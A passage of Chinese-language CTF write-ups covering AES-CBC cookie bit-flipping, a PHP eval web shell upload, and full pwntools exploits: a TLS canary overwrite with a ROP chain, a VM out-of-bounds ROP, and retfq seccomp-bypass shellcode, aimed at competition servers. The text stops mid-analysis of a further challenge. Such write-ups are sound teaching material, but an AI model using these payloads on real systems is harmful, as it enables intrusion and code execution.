# Rewind

## WEB

### checkin \| whocansee

分析源码得知cookie是用AES与CBC分组模式加密的，由于key未知不能直接用题给源码改明文后加密，故利用xor的性质写出解密脚本。

```python
from Crypto.Cipher import AES # 此处报错则检查是否安装Crypto库，是否把装好的Crypto文件夹名称首字母大写**
import binascii
import base64
import json
ciphertext = "originalcookie"
ciphertext = base64.b64decode(ciphertext)
ciphertext = list(ciphertext)
ciphertext[n] = ciphertext[n]^ ord('g') ^ ord('a')
ciphertext[n+1] = ciphertext[n+1]^ ord('u') ^ ord('d')
ciphertext[n+2] = ciphertext[n+2]^ ord('e') ^ ord('m')
ciphertext[n+3] = ciphertext[n+3]^ ord('s') ^ ord('i')
ciphertext[n+4] = ciphertext[n+4]^ ord('t') ^ ord('n')
print(base64.b64encode(bytes(ciphertext)))
```
n的值为想要修改的字符（此处是g,u,e,s,t）在明文字符串中的位置，这里是按照1开始计算的，比如g是第十一个，n就为11. 实际的操作是**修改后的字符** = **修改前的字符** 和 **它前一个修改前的字符**xor运算 再和 **它前一个修改后的字符**做xor运算。

### include \| whocansee

用BrupSuite抓包，给cookie进行base64解码，直接能看到明文，修改明文最后那个s:7:tourist为s:5:Lteam后再给编码回去，修改原cookie，获得上传权限，传个一句话木马上去   `<?php @eval($_POST['flag']);?>` 发现连路径都给了，于是直接拿Antsword连接，在根目录拿到flag。

## Pwn

### Gods \| Wings

64 位可执行文件, 没开 PIE, 其他保护都开了. `aaa; s main; pdg`:

```c
undefined8 main(void)
{
    int32_t iVar1;
    int64_t in_FS_OFFSET;
    char *s1;
    undefined2 var_ah;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stderr, 0, 2, 0);
    s1 = (char *)0x0;
    var_ah = 0;
    do {
        sym.imp.puts("Do you know who is the God of XDSEC? (*^_^*)");
        sym.imp.__isoc99_scanf("%8s", &s1);
        iVar1 = sym.imp.strcmp(&s1, "yes");
        if (iVar1 == 0) {
            sym.imp.pthread_create(obj.pid, 0, sym.vuln, 0);
            iVar1 = sym.imp.pthread_join(_obj.pid, 0);
            if (iVar1 != 0) {
    // WARNING: Subroutine does not return
                sym.imp.exit(0);
            }
            break;
        }
        iVar1 = sym.imp.strcmp(&s1, "no");
    } while (iVar1 != 0);
    if (canary == *(int64_t *)(in_FS_OFFSET + 0x28)) {
        return 0;
    }
    // WARNING: Subroutine does not return
    sym.imp.__stack_chk_fail();
}
```

不知道为什么 rizin 没有分析到字符串. 可以用 `psz @ addr` 看这个位置的字符串. 为方便, 上述代码以及经过替代.

main 函数很简单, 就是一个循环, 如果输入 "yes" 就创建一个线程, 执行 `vuln` 函数; 如果输入 "no" 则退出程序.

`s sym.vuln; pdg`:

```c
undefined8 sym.vuln(int64_t arg1)
{
    int64_t in_FS_OFFSET;
    int64_t var_58h;
    uint16_t var_46h;
    char *var_44h;
    int64_t var_38h;
    int64_t var_30h;
    int64_t var_28h;
    char *var_20h;
    int64_t var_18h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    var_44h._0_4_ = 0;
    var_46h = 0;
    var_28h = 0;
    stack0xffffffffffffffb8 = (char *)0x0;
    var_38h = 0;
    var_30h = 0;
    var_20h = (char *)0x0;
    var_18h = 0;
    sym.imp.puts("Make your list of XDSEC gods.\n");
    sym.imp.puts("Undoubtedly, the god of all gods is \'Rx\'!");
    sym.imp.puts("I will write it down for you, and you fill in the rest.");
    stack0xffffffffffffffb8 = (char *)CONCAT53(stack0xffffffffffffffbb, 0x7852);
    for (; 0 < _obj.edit_times; _obj.edit_times = _obj.edit_times + -1) {
        sym.imp.puts("Add new god:");
        sym.imp.printf("Rank: ");
        sym.imp.__isoc99_scanf("%hd", &var_46h);
        if (var_46h < 2) {
            sym.imp.puts("Damn, I\'m angry!");
    // WARNING: Subroutine does not return
            sym.imp.exit(0);
        }
        sym.imp.printf("Name: ");
        sym.imp.__isoc99_scanf("%7s", &var_28h);
        *(int64_t *)((int64_t)&var_44h + (int64_t)(int32_t)(var_46h - 1) * 8 + 4) = var_28h;
        sym.imp.puts("\n## List of Gods ##");
        for (var_44h._0_4_ = 0; (int32_t)var_44h < 3; var_44h._0_4_ = (int32_t)var_44h + 1) {
            sym.imp.printf("%d. %s\n", (int32_t)var_44h + 1, (int64_t)&var_44h + (int64_t)(int32_t)var_44h * 8 + 4);
        }
        sym.imp.puts("");
    }
    sym.imp.puts("Finally, what\'s your name?");
    sym.imp.__isoc99_scanf("%72s", &var_20h);
    sym.imp.printf("Oh dear \'%s\', I hope one day you can be a god of XDSEC!\n", &var_20h);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return 0;
}
```

for 循环之前是一些初始化和打印信息. 循环内部根据打印的信息可以看出 unsigned short 变量 `var_46h` 是排名(下面改名为 `rank`), 字符串 `var_28h` 是名字(下面改名为 `name`), 如果输入的排名大于 1, 则会向栈上的一个地方写入这个字符串. 第 38 行用人话写就是 `names[rank - 1] = name` (`var_40h` 在 rbp - 0x40 的位置, 为了方便改名为 `names`). 之后的循环是输出 `names[0]`, `names[1]`, `names[2]`. 然后继续输入. 一共输入 `_obj.edit_times` 次, `px @ obj.edit_times` 可以查看数据, 为 2. 也就是说, 一共可以输入两次.

注意到, `rank` 并没有限制在 0 \~ 3 中, 这里存在数组越界漏洞. 所以可以 **向栈上写入数据**.

先继续看程序, 跳出循环后, 提示输入, 可以输入 72 (0x48) 个字符, 存在 `var_20h` (为方便, 改名 `my_name`) 处. 然而, `my_name` 在 `rbp - 0x20` 的地方, 也就是说存在比较大的溢出空间. 这可以方便我们构造 ROP.

程序开启了 canary, 需要想办法绕过. 注意到我们可以通过 rank 向栈任意(也不是那么任意, 最远到 $2^{16}$, 不过也足够了) 位置写入数据. 而这个 `vuln` 函数是在线程中运行的.

程序在创建线程时, 线程会被分配新的栈, 然后把 **线程本地存储 (Thread Local Storage)** 压入栈顶, 同时设置寄存器 fs(32 位是寄存器 gs) 的值为 TLS 的地址. 然后执行线程函数. TLS 的结构如下:

```c
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
               thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  unsigned long int vgetcpu_cache[2];
  /* Bit 0: X86_FEATURE_1_IBT.
     Bit 1: X86_FEATURE_1_SHSTK.
   */
  unsigned int feature_1;
  int __glibc_unused1;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
  /* The lowest address of shadow stack,  */
  unsigned long long int ssp_base;
  /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
 
  void *__padding[8];
} tcbhead_t;
```

其中, `stack_guard` (fs + 0x28 或者 gs + 0x33 位置) 就是函数取 canary 的地方. 函数前后, 会把程序调用栈上的 canary 和 TLS 上的 `stack_guard` 进行比较. 如果不同, 则认为程序发生了栈溢出, 调用函数 `__stack_chk_fail()`.

`vuln` 函数的第 14 行, 第 48 \~ 51 行就是在进行 canary 检查:

```c
    // ...
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    // ...
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    // ...
```

由于具有任意地址写的功能, 那么可以修改 `stack_guard` (fs + 0x28) 的值, 同时修改 canary, 保证两者相等, 就能够绕过 canary 了.

由于栈上数据相对位置不变, 所以只需要简单计算一下偏移, 然后计算 rank 取多少, 能够写入到 `stack_guard` 的位置就行.

调试模式启动 rizin, 断点下到 `vuln` 处. 运行程序. `dr fs; dr rbp` 查看 fs 和 rbp:

```
[0x00401236]> dr fs; dr rbp
0x7f1ba00fd700
0x7f1ba00fcef0
```

然后计算 (fs+0x28) - (rbp-0x40) = 0x878, 再除以 `sizeof(names[0])` = 8, 得到 rank - 1 = 0x10f, 所以 rank = 0x10f + 1 = 0x110 = 272. 也就是输入 rank 为 272, 然后输入一个数, 构造 ROP 覆盖 canary 的时候也写这个数就行了.

接下来需要知道 libc 的偏移. 可以找一个已调用过的库函数, 如 puts. 由于还需要输入, 再利用一次栈溢出才能构造获得 shell 的 ROP, 所以将最后的返回地址填为 sym.vuln.

需要找一个 pop rdi; ret 用来传参, `"/R/ pop rdi; ret"`

```
[0x00401236]> "/R/ pop rdi;ret"
  0x004015d3                 5f  pop rdi
  0x004015d4                 c3  ret
```

将打印出来的 got.puts 内容, 也就是 puts 的真实地址, 减去 libc.so 中 puts 的地址, 就得到了偏移.

然后 vuln 会再次运行, 不过因为全局变量 `obj.edit_times` 已经是 0 了, 就不会进入循环, 而是直接输入 `my_name`. 这个时候再利用计算出的偏移以及 libc.so 中的 `system` 函数和 `"/bin/sh"` 字符串, 即可得到 shell.

64 位程序调用 `system` 需要堆栈对齐, 可能需要在 ROP 链之前加一个 `ret` 来使栈对齐.

exp:

```python
from pwn import *

io = process('./gods')
# io = remote('pwn.archive.xdsec.chall.frankli.site', 10086)

elf = ELF('./gods')
libc = ELF('./libc-2.31.so')
sym_vuln = elf.sym['vuln']
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
pop_rdi_ret = 0x004015d3
ret = pop_rdi_ret + 1

io.sendline(b'yes')

io.sendline(b'272 aaaaaaa') # 覆盖 TLS 中的 stack_guard
io.sendline(b'8 aaaaaaa')

payload_leak = b'a' * (0x20 - 0x08) + b'aaaaaaa\x00' + b'a' * 0x08
payload_leak += p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(sym_vuln)

io.sendline(payload_leak)
io.recvuntil(b'XDSEC!\n')
puts_addr = u64(io.recvline()[0:6].ljust(8, b'\x00'))
print(hex(puts_addr))

libc_offset = puts_addr - libc.sym['puts']
print(hex(libc_offset))

libc_system = libc.sym['system']
system_addr = libc_system + libc_offset
libc_bin_sh = next(libc.search(b'/bin/sh'))
bin_sh_addr = libc_offset + libc_bin_sh

payload_shell = b'a' * (0x20 - 0x08) + b'aaaaaaa\x00' + b'a' * 0x08
payload_shell += p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

print(len(payload_shell))

io.sendline(payload_shell)
io.interactive()
```

### Mini Bug \| Wings

先假装我是 docker, 跑一遍 docker file, 得到 patch 过的源码和可执行文件. 检查可执行文件的信息, 64 位程序, 保护全开.

然后仔细阅读源码, 发现这是一个用 c 写的简易虚拟机, 支持一些存取和运算指令.

```c
typedef enum {
    NOOP    = 0,
    IADD    = 1,   // int add
    ISUB    = 2,
    IMUL    = 3,
    ILT     = 4,   // int less than
    IEQ     = 5,   // int equal
    BR      = 6,   // branch
    BRT     = 7,   // branch if true
    BRF     = 8,   // branch if true
    ICONST  = 9,   // push constant integer
    LOAD    = 10,  // load from local context
    GLOAD   = 11,  // load from global memory
    STORE   = 12,  // store in local context
    GSTORE  = 13,  // store in global memory
    PRINT   = 14,  // print stack top
    POP     = 15,  // throw away top of stack
    CALL    = 16,  // call function at address with nargs,nlocals
    RET     = 17,  // return value from function
    HALT    = 18
} VM_CODE;
```

main.c 是输入虚拟指令, 然后执行.

```c

int main(int argc, char *argv[]) {
    init();
    int code[128], nread = 0;
    puts("Input your code:");
    while (nread < sizeof(code)) {
        int ret = read(0, code+nread, sizeof(code)-nread);
        if (ret <= 0) break;
        nread += ret;
    }

    VM *vm = vm_create(code, nread/4, 0);
    vm_exec(vm, 0, true);
    vm_free(vm);
    return 0;
}

```

观察打 patch 的部分, 限制了全局 "地址" 和局部变量的 "偏移" 不能为负数. 如果没有这个检查, 那么可能可以利用负数下标造成越界溢出. 这启示我们去找负数下标.

```c
            case LOAD: // load local or arg
                offset = vm->code[ip++];
                if(offset<0){
                    fprintf(stderr, "Invalid offset:%d\n", offset);
                    break;
                }
                vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
                break;
            case GLOAD: // load from global memory
                addr = vm->code[ip++];
                if(addr<0){
                    fprintf(stderr, "Invalid addr:%d\n", addr);
                    break;
                }
                vm->stack[++sp] = vm->globals[addr];
                break;
```

发现对 sp 没有进行检查. 也就是说, `vm->stack[sp]` 可以造成越界. 但问题是 stack 这块空间是 calloc 分配的堆空间. ~~没学过堆, 润了~~

```c
typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;

VM *vm_create(int *code, int code_size, int nglobals)
{
    VM *vm = calloc(1, sizeof(VM));
    vm_init(vm, code, code_size, nglobals);
    return vm;
}
```

但是, 仔细观察 VM 结构体, 可以发现, code 是一个指针, 而 code 是定义在 main.c 中的 main 函数里的. 同时, globals 也是一个指针, 这两个指针, 和 stack 都在堆中, 而且 code 和 globals 在 stack "上方", 也就是说, stack 负下标, 是可以读写 code 和 globals 的. 指令 GLOAD 和 GSTORE 可以用来操作 globals 数组. 如果可以修改 globals 指针的值, 使其和 code 指针一样, 即指向 main 函数中的 code, 那么就可以任意读写 main 函数的栈了.

发现了这一点, 接下来就很简单了. 读取到 main 的返回地址, 得到 `__libc_start_mian_ret`, 结合给的 libc.so 计算偏移, 然后构造 ROP 获得 shell 即可.

比较麻烦的一点是, 只能进行一次读入指令和执行, 所以所有的计算都需要在 "虚拟机" 中执行. 也就是得写指令操作码.

通过查看源码结合调试可以确定, struct VM 结构如下:

```
+------------------------+
|          *code         |
+------------+-----------+
|  code_size |           |
+------------+-----------+
|        *globals        |
+------------+-----------+
|  nglobals  |           |
+------------+-----------+
|                        |
|        stack[]         |
|                        |
+------------------------+
|                        |
|                        |
|      call_stack[]      |
|                        |
|                        |
+------------------------+
```

于是,

- stack[-8] = code_low
- stack[-7] = code_high
- stack[-6] = code_size
- stack[-4] = globals_low
- stack[-3] = globals_high
- stack[-2] = nglobals

注意到程序最后执行了 `free(globals)`, 所以在完后要把 globals 恢复, free code 会触发异常. 这就需要将 globals 原来的值存起来, 最后恢复一下.

因为我们会直接修改掉 globals, 所以不能使用 GSTORE 来存数据, 同时也没办法不存储任何数据就做到读取 code, 改变 globals 等一系列操作. 所以需要使用局部变量 (针对这个虚拟机而言), 也就是 STORE 和 LOAD 进行数据的存储. 而一开始, callsp = -1, 此时直接 STORE 或者 LOAD 会执行语句 `vm->call_stack[callsp].locals[offset]` 从而读或写非法的内存 (当然如果愿意算这个巨大的偏移使 `vm->call_stack[callsp].locals[offset]` 指向合法的内存那当我没说). 所以我们不能简单地 POP 使 sp--. 必须使用 CALL 来让 `callsp = 0` 先.

将 globals 修改为 code 地址后, 就可以使用 GSTORE 和 GLOAD 来读写 main 函数栈上的数据了. 由于虚拟机局部变量的数组是 int 型的, 一个元素占 4 个字节, 而 64 位的地址是 8 个字节的, 读写栈上的数据需要两个元素, 需要注意一下. 但是 libc.so 加载完毕后, 它其中的符号地址仅需要改变低地址位置的 4 个字节就行, 这可以给计算带来方便.

之后构造 ROP 链即可, 只不过计算还是要放在虚拟机中进行. ROP 链的结构和 [Gods](#gods) 完全一致, 不再赘述. 不同的一点在于, 由于开了 PIE, 所以没办法从这个程序中确定一个 `pop rdi; ret`, 但是我们有 libc.so, 以及它加载在内存中的偏移, 所以完全可以在 libc.so 中找一个 `pop rdi; ret` 写上去.

exp:

```python
from pwn import *

NOOP    = p32(0)
IADD    = p32(1)   # int add
ISUB    = p32(2)
IMUL    = p32(3)
ILT     = p32(4)   # int less than
IEQ     = p32(5)   # int equal
BR      = p32(6)   # branch
BRT     = p32(7)   # branch if true
BRF     = p32(8)   # branch if true
ICONST  = p32(9)   # push constant integer
LOAD    = p32(10)  # load from local context
GLOAD   = p32(11)  # load from global memory
STORE   = p32(12)  # store in local context
GSTORE  = p32(13)  # store in global memory
PRINT   = p32(14)  # print stack top
POP     = p32(15)  # throw away top of stack
CALL    = p32(16)  # call function at address with nargs,nlocals
RET     = p32(17)  # return value from function
HALT    = p32(18)


# 计算真实地址, 存在栈上, sp 是低位, sp-1 是高位
def get_real_addr(libc_addr):
    code  = LOAD + p32(1)
    code += LOAD + p32(0)
    code += ICONST + p32(libc_addr)
    code += IADD
    return code

# 写入地址
def write_to_gobals(offset):
    code  = GSTORE + p32(offset)
    code += GSTORE + p32(offset + 1)
    return code

libc = ELF('./libc-2.31.so')
libc___libc_start_main_ret = 0x000240b3
libc_system = libc.sym['system']
libc_pop_rdi_ret = 0x00023b72
libc_ret = libc_pop_rdi_ret + 1
libc_str_bin_sh = next(libc.search(b'/bin/sh'))

code  = CALL + p32(4) + p32(1) + p32(0) # sp 指向 *globals
code += STORE + p32(3) + STORE + p32(2) # 将 *globals_low 存在 locals[2], *globals_high 存在 locals[3] 中
code += POP + POP                       # sp 指向 *code
code += STORE + p32(0) + STORE + p32(1) # 将 *code 的高 8 byte 和 低 8 byte 存起来
code += LOAD + p32(1) + LOAD + p32(0)   # 恢复
code += ICONST + p32(114514)            # 修改一下 code_size, 万一 ip 太大了呢?
code += ICONST + p32(0)                 # 这块空间用作对齐, 直接跳过就行
code += LOAD + p32(1) + LOAD + p32(0)   # 修改 *globals
# code += ICONST + p32(140)             # 修改一下 nglobals, 调试用
code += ICONST + p32(0)

'''
code[0x84 = 132] 是 rbp (old rbp)
code[0x84 + 2 = 134] 是 ra_low
code[0x84 + 3 = 135] 是 ra_high
offset = ra - libc___libc_start_main_ret
而, libc___libc_start_main_ret 比较小, 所以只需要用 ra 的低位去减, 高位不变, 即可得到 offset.
'''
code += GLOAD + p32(134)
code += ICONST + p32(libc___libc_start_main_ret)
code += ISUB                            # 现在栈上是 offset_low 了
code += STORE + p32(0)                  # 存到 local[0]
code += GLOAD + p32(135)                # 存高位到 local[1]
code += STORE + p32(1)                  # 现在 offset_low = local[0], offset_high = local[1]

# 构造 rop 链.
code += get_real_addr(libc_ret)
code += write_to_gobals(134)
code += get_real_addr(libc_pop_rdi_ret)
code += write_to_gobals(136)
code += get_real_addr(libc_str_bin_sh)
code += write_to_gobals(138)
code += get_real_addr(libc_system)
code += write_to_gobals(140)

# 恢复 globals
code += POP + POP + POP
code += LOAD + p32(2)
code += LOAD + p32(3)

code += HALT
code = code.ljust(128*4, b'\x00')

# io = process('./test')
io = remote('pwn.archive.xdsec.chall.frankli.site', 10013)

io.recvuntil(b'Input your code:\n')
io.send(code)
io.interactive()
```

### Shellcode \| Wings

检查信息, 64 位可执行文件, 保护全开. `s main;pdg`:

```c
undefined8 main(void)
{
    int32_t iVar1;
    
    fcn.0000123d();
    sym.imp.read(0, *(code **)0x4018, 0x100);
    iVar1 = fcn.00001209((char *)*(code **)0x4018);
    if (iVar1 != 0) {
        (**(code **)0x4018)();
    }
    return 0;
}
```

把输入当成函数执行了. 不过之前调用了一下 fcn.0000123d 函数. `s fcn.0000123d; pdg`:

```c
void fcn.0000123d(void)
{
    int32_t iVar1;
    int64_t in_FS_OFFSET;
    unsigned long v3;
    int64_t var_58h;
    int64_t var_50h;
    int64_t var_48h;
    int64_t var_40h;
    int64_t var_38h;
    int64_t var_30h;
    int64_t var_28h;
    int64_t var_20h;
    int64_t var_18h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    var_50h = 0x20;
    var_48h = 0x4000000000050025;
    var_40h = 0x100040015;
    var_38h = 0x500030015;
    var_30h = 0x20015;
    var_28h = 0x900010015;
    var_20h = 6;
    var_18h = 0x7fff000000000006;
    v3._0_2_ = 8;
    var_58h = (int64_t)&var_50h;
    iVar1 = sym.imp.prctl(0x26, 1, 0, 0, 0);
    if (iVar1 < 0) {
        sym.imp.perror("prctl(PR_SET_NO_NEW_PRIVS)");
    // WARNING: Subroutine does not return
        sym.imp.exit(2);
    }
    iVar1 = sym.imp.prctl(0x16, 2, &v3);
    if (iVar1 < 0) {
        sym.imp.perror("prctl(PR_SET_SECCOMP)");
    // WARNING: Subroutine does not return
        sym.imp.exit(2);
    }
    *(undefined8 *)0x4018 = sym.imp.mmap(0, 0x100, 7, 0x22, 0xffffffff, 0);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

看到了 prctl 函数, ~~搜索一下~~发现是沙箱机制.

**沙箱 (sandbox)** 机制用来禁用系统调用. 假如禁用了 execve 系统调用. 那么就不能简单写 `execve("/bin/sh", NULL, NULL)` shellcode 来获得 shell 了.

使用 seccomp-tools 可以查看能够使用的系统调用:

```shell
seccomp-tools dump ./shellcode 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x25 0x05 0x00 0x40000000  if (A > 0x40000000) goto 0007
 0002: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0007
 0003: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0007
 0004: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0007
 0005: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0007
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

发现仅有 write, fstat, read, mmap 可用. 看到 write 和 read, 合理怀疑应该是 orw (open, read, write) 获取 flag. 但是缺少了 open. 一通搜索后发现, fstat 的系统调用和 32 位下 open 是一样的. 又一通搜索后发现, 64 位程序可以用 `retfq` 指令切换到 32 运行模式, 32 位下又可以通过 `retf` 切换回来.

`retfq` 会首先 `pop rip`, 然后 `pop cs`. cs (Code Secgment) 寄存器的值为 0x23 时, 程序以 32 位模式运行. 为 0x33 时, 以 64 位模式运行. (具体原理和 CPU 寻址有关, 不是很懂, 下次再学.)

需要注意的是, 当程序从 64 位变到 32 位后, 由于寻址能力的不同, 寄存器如 rsp, rip 等仅会保留低 32 位的值, 这样以来, 指令就不能正确访问, 栈的位置也因为 "截断" 而迁移到了非法内存. 所以需要把指令和栈想办法先丢到低地址去. 这时, mmap 就能发挥作用了. 可以尝试申请一块地址在 0x40404000 的内存 (为什么是这个数? 因为搜到的类似题目的 wp 都用的这个数), 并且确保这块内存具有可读可写可执行权限. 把 rsp 跳到这块内存的某一处, rip 跳到另一处, 就达到了迁移的效果.

main 函数在执行 shellcode 前, 还调用了 fcn.00001209. `s fcn.00001209; pdg`:

```c
bool fcn.00001209(char *arg1)
{
    int64_t iVar1;
    char *s;
    
    iVar1 = sym.imp.strchr(arg1, 0xffffffcb);
    return iVar1 == 0;
}
```

这个函数就是检查输入有没有 0xcb, 有的话就不执行 shellcode. 0xcb 对应的指令是 retf, 0x48 0xcb 对应的指令是 retfq. 也就是代码还需要绕过一下这个检查. 向申请的那块内存中写指令的时候, 可以用一下 xor 或者 add, sub 等操作达到目的. (怎么有人手工汇编然后用汇编向某块内存中写汇编指令的啊)

到这里就只剩下写 shellcode 了, 逻辑是先 mmap 一段低地址内存 (比如 0x40404000), 然后向这块内存中写指令: 先 retfq 切换到 32 位, 然后 open, 再用 retq 切换回 64 位, 最后 read 打开的文件, 将数据保存到可用位置 (比如 0x40404200), 再 write 到屏幕. 写完指令后, 将栈指针迁移到可用的低地址位置 (比如 0x40404100), 然后跳转到刚刚写的指令位置 (0x40404000).

exp:

```python
from pwn import *

shellcode_mmap = asm('''
mov edi, 0x40404000
mov esi, 0x100
mov edx, 0x7
mov ecx, 0x22
mov r8d, 0xffffffff
mov r9d, 0
mov eax, 0x09
syscall
''', arch='amd64', os='linux')

shellcode_mov_sp = asm('''
mov esp, 0x40404100
''', arch='amd64', os='linux')


'''
push 0x23
push rdx; rdx=0x40404005, 即下一条指令地址
retfq
'''
shellcode_write_to_mem_retfq = asm('''
mov dl, 0xc0
xor dl, 0x0b
mov byte ptr [rax+0x04], dl
mov edx, eax
add edx, 0x05
mov dword ptr [rax], 0x4852236a
''', arch='amd64', os='linux')


'''
push 0x00006761
push 0x6c662f2e
xor ecx, ecx
xor eax, eax
xor al, 0x05
mov ebx, esp
int 0x80
pop ebx
pop ebx
'''
shellcode_write_to_mem_open_flag_86 = asm('''
mov byte ptr [rdx], 0x68
mov dword ptr [rdx+0x01], 0x6761
mov byte ptr [rdx+0x05], 0x68
mov dword ptr [rdx+0x6], 0x6c662f2e
mov dword ptr [rdx+0x0a], 0xc031c931
mov dword ptr [rdx+0x0e], 0xe3890534
mov dword ptr [rdx+0x12], 0x5b5b80cd
''', arch='amd64', os='linux')


'''
push 0x33
push 0x40404023; 为下一条指令地址
retf
'''
shellcode_write_to_mem_retf = asm('''
mov dword ptr [rdx+0x16], 0x2368336a
mov ebx, 0xc0404040
xor ebx, 0x0b000000
mov dword ptr [rdx+0x1a], ebx
''', arch='amd64', os='linux')

'''
mov rdi, rax;
mov esi, 0x40404200;
xor rdx, rdx
add dl, 0x40
xor rax, rax;
syscall;
'''
shellcode_write_to_mem_read = asm('''
mov dword ptr [rdx+0x1e], 0xbec78948
mov dword ptr [rdx+0x22], 0x40404200
mov dword ptr [rdx+0x26], 0x80d23148
mov dword ptr [rdx+0x2a], 0x314840c2
mov dword ptr [rdx+0x2e], 0x050fc0
''', arch='amd64', os='linux')

'''
mov dil, 1
xor rax, rax
xor rax, 1
syscall
'''
shellcode_write_to_mem_write = asm('''
mov dword ptr [rdx+0x31], 0x4801b740
mov dword ptr [rdx+0x35], 0x8348c031
mov dword ptr [rdx+0x39], 0x050f01f0
''', arch='amd64', os='linux')

shellcode_jmp_to_mem = asm('''
push rax
ret
''', arch='amd64', os='linux')

# io = process('./shellcode')

io = remote('pwn.archive.xdsec.chall.frankli.site', 10051)

shellcode = shellcode_mmap
shellcode += shellcode_write_to_mem_retfq
shellcode += shellcode_write_to_mem_open_flag_86
shellcode += shellcode_write_to_mem_retf
shellcode += shellcode_write_to_mem_read
shellcode += shellcode_write_to_mem_write
shellcode += shellcode_mov_sp
shellcode += shellcode_jmp_to_mem

io.sendline(shellcode)
io.interactive()
```

手工汇编写到一半发现, 好像可以直接调用 read 向 mmap 的那块内存中写数据... 我好蠢.

retf 和 retfq 的地方随便填充一下, 读完以后用类似 `mov ax, 0xc0; xor ax, 0x0b; mov [addr], ax` 写过去补一下就行.

### Easy Httpd \| Wings

检查一下信息, 64 位可执行文件, 保护全开. 丢进 ida 里反一反(rizin 反出来的东西看不懂捏, 汇编也看不懂捏), main 函数如下:

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int *v3; // rax
  char *v4; // rax
  int *v5; // rax
  char *v6; // rax
  int *v7; // rax
  char *v8; // rax
  int *v9; // rax
  char *v10; // rax
  int fd; // [rsp+8h] [rbp-28h]
  int v12; // [rsp+Ch] [rbp-24h]
  struct sockaddr addr; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v14; // [rsp+28h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  ((void (__fastcall *)(__int64, char **, char **))((char *)&sub_1468 + 1))(a1, a2, a3);
  puts("Welcome to 2022 MiniL");
  fd = socket(2, 1, 0);
  if ( fd == -1 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    fprintf(stderr, "Socket error:%s\n", v4);
    exit(1);
  }
  addr.sa_family = 2;
  *(_QWORD *)&addr.sa_data[6] = 0LL;
  *(_DWORD *)&addr.sa_data[2] = htonl(0);
  *(_WORD *)addr.sa_data = htons(0x800u);
  if ( bind(fd, &addr, 0x10u) == -1 )
  {
    v5 = __errno_location();
    v6 = strerror(*v5);
    fprintf(stderr, "Bind error:%s\n", v6);
    exit(1);
  }
  if ( listen(fd, 5) == -1 )
  {
    v7 = __errno_location();
    v8 = strerror(*v7);
    fprintf(stderr, "Listen error:%s\n", v8);
    exit(1);
  }
  while ( 1 )
  {
    v12 = accept(fd, 0LL, 0LL);
    if ( v12 >= 0 )
    {
      sub_17DE(v12);
      close(v12);
    }
    else
    {
      v9 = __errno_location();
      v10 = strerror(*v9);
      printf("accept socket error: %s\n", v10);
    }
  }
}
```

大概看一下, 可以看出这是在建立 socket 通信. 本地会开 2048 端口, 远程就是开容器之后给的端口, 所以 bind 的 addr 不需要管. 建立链接后, 会执行 sub_17DE 函数:

```c
void __fastcall sub_17DE(unsigned int a1)
{
  void *ptr; // [rsp+10h] [rbp-10h]
  char *s1; // [rsp+18h] [rbp-8h]

  ptr = (void *)sub_16CD(a1);
  s1 = (char *)sub_15BF(ptr);
  if ( s1 )
  {
    if ( strcmp(s1, "/home/minil/flag") )
    {
      sub_14CE(s1, a1);
      free(ptr);
      free(s1);
    }
  }
}
```

sub_16CD 函数:

```c
char *__fastcall sub_16CD(int a1)
{
  int *v1; // rax
  char *v2; // rax
  int i; // [rsp+18h] [rbp-118h]
  char haystack[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+128h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = 0; i <= 254; ++i )
  {
    if ( recv(a1, &haystack[i], 1uLL, 0) < 0 )
    {
      v1 = __errno_location();
      v2 = strerror(*v1);
      fprintf(stderr, "recv error:%s\n", v2);
    }
    if ( strstr(haystack, "\r\n\r\n") )
      break;
  }
  if ( i == 255 )
    haystack[254] = 0;
  else
    haystack[i] = 0;
  return strdup(haystack);
}
```

这个函数就是通过 recv 进行简单的输入. 碰到 `"\r\n\r\n"` 或者输入长度大于 254 则停止. 返回接收的数据 (字符串).

sub_15BF 函数:

```c
